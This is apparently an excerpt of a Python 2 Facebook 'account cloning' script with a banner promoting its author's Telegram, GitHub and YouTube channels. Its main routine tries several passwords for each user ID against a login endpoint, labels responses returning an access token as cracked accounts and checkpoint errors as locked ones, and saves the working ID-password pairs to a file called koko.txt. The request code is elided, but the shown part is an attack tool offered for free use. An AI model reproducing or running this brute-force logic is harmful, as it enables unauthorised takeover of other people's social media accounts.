# MY TELEGRAM CHANNEL @koko Hickar
# MY TELEGRAM GROUP @ Tar Max Komand 
#MY GITHUB HTTPS://GITHUB.COM/koko Hickar420 
#THIS SCRIPT FREE 
...
koko Hickar_youtube = random.choice(["https://youtube.com/channel/UCXjyXBDIBD_dXh0M9d8EIJA"])

youtuber = koko Hickar_youtube
...
def telegram():
	...
	os.system("xdg-open https://t.me/kokoHickar")
...
\033[1;97m               ─────────────•◈•──────────\033[1;0m
\033[1;97m--------------------------------------------------
\033[1;91m Author      : koko
\033[1;91m GitHub      : koko
\033[1;91m YouTube     : koko
\033[1;91m Telegram CH   : koko
\033[1;91m TLEGRAM GP    : koko
\033[1;97m--------------------------------------------------
"""
...
def Select_menu():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m[koko_OK] ' + k + c + user + ' | ' + pass1
                okb = open('koko.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;93m[koko_CP] ' + k + c + user + ' | ' + pass1
                cps = open('koko.txt', 'a')
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m[koko_OK] ' + k + c + user + ' | ' + pass2
                    okb = open('koko.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;93m[koko_CP] ' + k + c + user + ' | ' + pass2
                    cps = open('koko.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m[koko_OK] ' + k + c + user + ' | ' + pass3
                        okb = open('koko.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;93m[koko_CP] ' + k + c + user + ' | ' + pass3
                        cps = open('koko.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m[koko_OK] ' + k + c + user + ' | ' + pass4
                            okb = open('koko.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;93m[koko_CP] ' + k + c + user + ' | ' + pass4
                            cps = open('koko.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m[koko_OK] ' + k + c + user + ' | ' + pass5
                                okb = open('koko.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;93m[koko_CP] ' + k + c + user + ' | ' + pass5
                                cps = open('koko.txt', 'a')
    ...
    print ' Cloned Accounts Has Been Saved : koko.txt'
